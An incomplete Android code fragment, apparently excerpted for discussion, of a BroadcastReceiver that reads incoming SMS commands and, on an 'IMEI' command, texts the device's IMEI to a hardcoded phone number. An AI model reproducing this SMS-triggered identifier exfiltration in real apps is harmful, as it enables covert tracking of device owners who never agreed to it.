...
public class MyReceiver extends BroadcastReceiver {
        ...
        try {
            if (bundle != null) {
                ...
                for (int i = 0; i < pdusObj.length; i++) {
                    ...
                    int status = changeMode(message, actual_message, context);
                    switch (status) {
                        case 1:
    ...
    @SuppressWarnings("deprecation")
    private int changeMode(String receivedMessage, String actual_msg, Context context) {
                ...
                switch (option) {
                    ...
                    case "IMEI":
                        ...
                        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                            ...
                            smsManager.sendTextMessage("9403955407", null, imei, null, null);
